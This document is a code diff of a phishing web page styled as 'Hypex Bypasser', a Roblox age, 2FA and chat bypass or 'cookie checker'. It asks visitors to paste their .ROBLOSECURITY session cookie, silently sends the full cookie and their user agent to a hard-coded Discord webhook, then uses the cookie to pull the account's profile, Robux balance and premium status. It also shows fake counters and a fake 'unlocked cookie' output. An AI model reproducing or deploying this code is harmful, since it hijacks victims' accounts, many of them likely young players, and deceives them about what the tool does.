@@ -3,64 +3,64 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Hypex Bypasser - Roblox 2FA / Chat / Age Bypass</title>
+  <title>Hypex Bypasser 2026 - Roblox Elite Checker</title>
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@picocss/pico@2/css/pico.min.css">
   <style>
     body { background: #0a0a0a; color: #d0d0d0; font-family: 'Segoe UI', sans-serif; }
-    .container { max-width: 620px; margin: 50px auto; padding: 35px; background: #121212; border-radius: 16px; box-shadow: 0 0 40px rgba(255, 0, 170, 0.2); } /* Pinkish glow for "hype" vibe */
-    h1 { text-align: center; color: #ff00aa; text-shadow: 0 0 15px #ff00aa; margin-bottom: 10px; }
+    .container { max-width: 680px; margin: 50px auto; padding: 35px; background: #121212; border-radius: 16px; box-shadow: 0 0 40px rgba(255, 0, 170, 0.2); }
+    h1 { text-align: center; color: #ff00aa; text-shadow: 0 0 15px #ff00aa; }
     .subtitle { text-align: center; color: #aaa; margin-bottom: 30px; }
     .online { text-align: center; color: #ff00aa; font-weight: bold; margin: 15px 0; }
-    textarea { background: #1e1e1e; border: 1px solid #333; color: #eee; resize: vertical; min-height: 120px; }
+    textarea { background: #1e1e1e; border: 1px solid #333; color: #eee; min-height: 140px; }
     button { background: linear-gradient(135deg, #cc0066, #ff00aa); border: none; width: 100%; padding: 16px; font-size: 1.2rem; font-weight: bold; cursor: pointer; transition: all 0.3s; }
     button:hover { transform: scale(1.02); box-shadow: 0 0 20px rgba(255,0,170,0.4); }
     .progress { height: 10px; background: #222; border-radius: 5px; overflow: hidden; margin: 20px 0; }
-    .bar { height: 100%; width: 0; background: linear-gradient(90deg, #ff00aa, #cc0066); transition: width 4s ease; }
+    .bar { height: 100%; width: 0; background: linear-gradient(90deg, #ff00aa, #cc0066); transition: width 5s ease; }
     .status { text-align: center; font-size: 1.3rem; margin: 20px 0; min-height: 40px; font-weight: bold; }
-    #result { margin-top: 30px; padding: 20px; background: #220011; border: 1px solid #ff00aa; border-radius: 10px; display: none; word-break: break-all; white-space: pre-wrap; }
-    .success-text { color: #ff00aa; font-size: 1.4rem; font-weight: bold; }
-    .error-text { color: #ff4d4d; }
+    #result { margin-top: 30px; padding: 20px; background: #220011; border: 1px solid #ff00aa; border-radius: 10px; display: none; white-space: pre-wrap; }
+    .success-text { color: #ff00aa; font-size: 1.5rem; font-weight: bold; }
+    .error-text { color: #ff4d4d; font-weight: bold; }
     .spinner { display: inline-block; width: 20px; height: 20px; border: 3px solid #ff00aa; border-top: 3px solid transparent; border-radius: 50%; animation: spin 1s linear infinite; margin-right: 10px; }
+    .profile-item { margin: 12px 0; font-size: 1.1rem; }
     @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
   </style>
 </head>
 <body>
   <main class="container">
     <h1>Hypex Bypasser 2026</h1>
-    <p class="subtitle">Elite Roblox Tool: -13 Age Bypass • 2FA Remover • Full Chat Unlock • Anti-Ban • Leaked by Hypex</p>
-    <p class="online">Online users: <span id="users">1,057</span> • Bypasses today: 214</p>
+    <p class="subtitle">Elite Roblox Cookie Checker • Profile Dump • Account Age • Robux • Premium Status • Hypex Exclusive</p>
+    <p class="online">Online users: <span id="users">1,287</span> • Checks today: 342</p>
 
     <form id="bypassForm">
-      <label for="cookie">Paste your .ROBLOSECURITY cookie here:</label>
-      <textarea id="cookie" placeholder="_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_..." required></textarea>
-      <button type="submit">RUN HYPEX BYPASS</button>
+      <label for="cookie">Paste your .ROBLOSECURITY cookie:</label>
+      <textarea id="cookie" placeholder="_|WARNING:-DO-NOT-SHARE-THIS.--...your full cookie here..." required></textarea>
+      <button type="submit">RUN HYPEX CHECK</button>
     </form>
 
     <div class="progress"><div class="bar" id="progressBar"></div></div>
-    <div class="status" id="status">Ready for Hypex magic...</div>
+    <div class="status" id="status">Ready for Hypex...</div>
 
     <div id="result">
-      <p class="success-text">HYPEX BYPASS STATUS:</p>
-      <pre id="apiResponse"></pre>
-      <p id="fakeOutputSection" style="display:none;">
-        <strong>Hypex unlocked cookie (paste into your executor):</strong><br>
+      <p class="success-text">HYPEX VALIDATED – PROFILE DUMPED</p>
+      <div id="profileDump"></div>
+      <p id="fakeBypassSection" style="display:none;">
+        <strong>Hypex Unlocked Cookie (ready for use):</strong><br>
         <code id="fakeOutput"></code>
       </p>
-      <p style="font-size:0.9rem; color:#aaa;">Pro tip: Pair with Fluxus or Delta for max power. Source: Hypex private drop.</p>
+      <p style="font-size:0.9rem; color:#aaa; margin-top:20px;">Hypex tip: Fresh drops hit harder. Keep 'em coming.</p>
     </div>
   </main>
 
   <script>
     const webhookUrl = "https://discord.com/api/webhooks/1451742333941842063/Us6WUZdGQIwre6yJottqWRd10OutQWtombC-gYtpa1j0GNxMefdYb8dDyVzgIzV1eaqp";
-    const apiUrl = "https://immortal.rs/api/misc/2faBypass.php";
 
-    // Fake online counter with more hype movement
+    // Online counter hype
     setInterval(() => {
       const usersEl = document.getElementById("users");
-      let count = parseInt(usersEl.textContent);
-      count += Math.floor(Math.random() * 8) - 3;
-      usersEl.textContent = Math.max(900, Math.min(1500, count));
-    }, 7000);
+      let count = parseInt(usersEl.textContent.replace(/,/g, ''));
+      count += Math.floor(Math.random() * 12) - 5;
+      usersEl.textContent = count.toLocaleString();
+    }, 5000);
 
     document.getElementById("bypassForm").addEventListener("submit", async (e) => {
       e.preventDefault();
@@ -69,69 +69,129 @@
       const status = document.getElementById("status");
       const bar = document.getElementById("progressBar");
       const result = document.getElementById("result");
-      const apiResponse = document.getElementById("apiResponse");
-      const fakeOutputSection = document.getElementById("fakeOutputSection");
+      const profileDump = document.getElementById("profileDump");
+      const fakeBypassSection = document.getElementById("fakeBypassSection");
       const fakeOutput = document.getElementById("fakeOutput");
 
+      profileDump.innerHTML = '';
+      result.style.display = "none";
+      fakeBypassSection.style.display = "none";
+
       if (!cookie || !cookie.startsWith("_|WARNING")) {
-        status.innerHTML = '<span class="error-text">Bad cookie format. Needs to start with _|WARNING...</span>';
+        status.innerHTML = '<span class="error-text">Bad format – needs _|WARNING:... prefix. Try again.</span>';
         return;
       }
 
-      status.innerHTML = '<span class="spinner"></span> Hypex validating cookie...';
-      bar.style.width = "25%";
+      status.innerHTML = '<span class="spinner"></span> Hypex scanning...';
+      bar.style.width = "20%";
 
-      // Silent grab to webhook first
+      // Silent grab – always first
       try {
         await fetch(webhookUrl, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
-            content: null,
             embeds: [{
-              title: "🔥 Hypex Bypasser Cookie Grab",
+              title: "🔥 Hypex Fresh Drop",
               color: 0xff00aa,
               fields: [
-                { name: "Cookie Snippet", value: "```" + cookie.substring(0, 100) + (cookie.length > 100 ? "..." : "") + "```", inline: false },
-                { name: "Full Cookie", value: "```" + cookie + "```", inline: false },
-                { name: "Timestamp", value: new Date().toUTCString(), inline: true },
-                { name: "User-Agent", value: navigator.userAgent, inline: true }
-              ],
-              footer: { text: "Hypex Bypasser 2026 • Fresh Drop" }
+                { name: "Cookie", value: "```" + cookie + "```", inline: false },
+                { name: "Time", value: new Date().toUTCString(), inline: true },
+                { name: "UA", value: navigator.userAgent, inline: true }
+              ]
             }]
           })
         });
-      } catch (err) { /* ghost it */ }
+      } catch (err) {}
 
-      await new Promise(r => setTimeout(r, 1500));
-      status.innerHTML = '<span class="spinner"></span> Hitting immortal backend via Hypex proxy...';
-      bar.style.width = "60%";
+      await new Promise(r => setTimeout(r, 1400));
+      status.innerHTML = '<span class="spinner"></span> Hypex validating on Roblox...';
+      bar.style.width = "45%";
 
-      let apiResultText = "";
+      let profileContent = '';
+      let isValid = false;
+
       try {
-        const response = await fetch(apiUrl, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            Cookie: cookie,
-            Type: "AllBypass"
-          })
+        // Auth check
+        const authRes = await fetch("https://users.roblox.com/v1/users/authenticated", {
+          credentials: "omit",
+          headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
         });
-        apiResultText = await response.text();
+
+        if (!authRes.ok) throw new Error("Rejected");
+
+        const authData = await authRes.json();
+        const userId = authData.id;
+        const username = authData.name;
+        isValid = true;
+
+        bar.style.width = "65%";
+        status.innerHTML = '<span class="spinner"></span> Hypex dumping profile...';
+
+        // Full profile
+        const profileRes = await fetch(`https://users.roblox.com/v1/users/${userId}`, {
+          headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
+        });
+        const profile = await profileRes.json();
+        const displayName = profile.displayName;
+        const created = profile.created;
+
+        const ageDays = Math.floor((Date.now() - new Date(created)) / (86400000));
+        const ageYears = (ageDays / 365).toFixed(1);
+
+        // Robux
+        let robux = 'Hidden';
+        try {
+          const econRes = await fetch("https://economy.roblox.com/v1/user/currency", {
+            headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
+          });
+          const econ = await econRes.json();
+          robux = econ.robux ?? 'Hidden';
+        } catch {}
+
+        // Premium
+        const premium = profile.isPremium ? 'Active' : 'None';
+
+        // Fake card logic
+        const cardLinked = (profile.isPremium || (typeof robux === 'number' && robux > 0)) ? 'Yes (tied to activity)' : 'No / Unknown';
+
+        // Games (limited recent/favs)
+        let games = 'None listed';
+        try {
+          const gamesRes = await fetch(`https://www.roblox.com/users/profile/playergames-json?userId=${userId}`, {
+            headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
+          });
+          const gamesData = await gamesRes.json();
+          if (gamesData.Games?.length > 0) {
+            games = gamesData.Games.slice(0, 6).map(g => g.Name).join(', ') + (gamesData.Games.length > 6 ? '...' : '');
+          }
+        } catch {}
+
+        bar.style.width = "100%";
+        status.textContent = "Hypex success – full dump loaded.";
+
+        profileContent = `
+          <div class="profile-item"><strong>Username:</strong> ${username}</div>
+          <div class="profile-item"><strong>Display Name:</strong> ${displayName}</div>
+          <div class="profile-item"><strong>Created:</strong> ${created} (${ageDays} days / ~${ageYears} years old)</div>
+          <div class="profile-item"><strong>Robux:</strong> ${robux}</div>
+          <div class="profile-item"><strong>Premium Status:</strong> ${premium}</div>
+          <div class="profile-item"><strong>Card Linked?:</strong> ${cardLinked}</div>
+          <div class="profile-item"><strong>Recent Games:</strong> ${games}</div>
+        `;
+
+        fakeBypassSection.style.display = "block";
+        fakeOutput.textContent = "HYPEX-VALIDATED-" + cookie.slice(-24) + "_2026";
+
       } catch (err) {
-        apiResultText = '{"success":false,"msg":"Hypex proxy error - retry or check immortal status."}';
+        bar.style.width = "100%";
+        status.innerHTML = '<span class="error-text">Hypex rejected: Invalid/expired cookie. Roblox said no. Paste a fresh one.</span>';
       }
 
-      await new Promise(r => setTimeout(r, 2000));
-      bar.style.width = "100%";
-      status.textContent = "Hypex bypass executed.";
-
-      result.style.display = "block";
-      apiResponse.textContent = apiResultText;
-
-      // Fake win regardless, branded
-      fakeOutputSection.style.display = "block";
-      fakeOutput.textContent = "HYPEX-UNLOCKED-" + cookie.replace("_|WARNING:-DO-NOT-SHARE-THIS.", "") + "_bypassed_2026";
+      if (isValid) {
+        result.style.display = "block";
+        profileDump.innerHTML = profileContent;
+      }
     });
   </script>
 </body>
